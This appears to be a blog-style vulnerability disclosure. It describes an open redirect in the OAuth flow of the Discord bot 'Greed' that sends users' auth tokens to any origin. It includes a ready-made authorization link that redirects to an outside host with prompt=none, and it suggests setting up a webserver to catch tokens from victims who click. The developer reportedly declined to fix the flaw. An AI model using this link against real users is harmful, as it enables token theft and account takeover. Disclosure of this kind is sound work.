## We are back to Medium writeups!!11!!1!!1!
*Won't fix*

[Website](https://greed.best) | [Discord](https://discord.gg/greed)

Greed is a medium-sized all-in-one bot with style of the Lucky Star anime. There's not too much to say about it.

![Portal](assets/greed1.png)

When you log in at `https://x.greed.best/oauth/login`, there is a parameter `redirect_uri` with value `https://greed.best/login` that is used as redirect after you authorize the greed application. I tried to change the value to `https://google.com` and the app redirected me to Google without any question after the authorization... and with a special thing:

```bash
HTTP/1.1 302 Found
Date: Wed, 29 Jul 2026 23:07:50 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Location: https://google.com/?token=****************
Server: cloudflare
Cf-Cache-Status: DYNAMIC
X-Xss-Protection: 1; mode=block
Speculation-Rules: "/cdn-cgi/speculation"
... [snip]
```

The authorization token that the dashboard was using to identify users was also being sent to the specified origin. This means that successful exploitation will also result in account takeover. Now, to actually exploit this, you would just craft a link like this:

```bash
https://discord.com/oauth2/authorize?client_id=1149535834756874250&redirect_uri=https://x.greed.best/oauth/callback&response_type=code&scope=identify%20guilds%20email&State=4355a46b19d348dc2f57c046f8ef63d4538ebb936000f3c9ee954a27460dd865&state=https://vzon.moe/&prompt=none
```

As this thing is using the `state` param to save the redirect in the flow, you don't need to go into the greed endpoint, and you set the `prompt` to `none` so users that already authorized the app go through the flow without interaction. Now you just code a minimalistic webserver and convince someone into entering this link.

https://github.com/user-attachments/assets/37bce41e-40eb-4f95-9c95-cb0e0ceed2b4

The dev just considered opening links as the same if a user opened their browser console and gave his token ("It's responsibility of the user clicking the link, not us."), so he won't fix this. View links carefully if you're using this bot.

> Note that under such reasoning, the guns.lol bug isn't also a vulnerability. Maybe he thinks that every user has the same caution and knowledge as him? I don't really know.








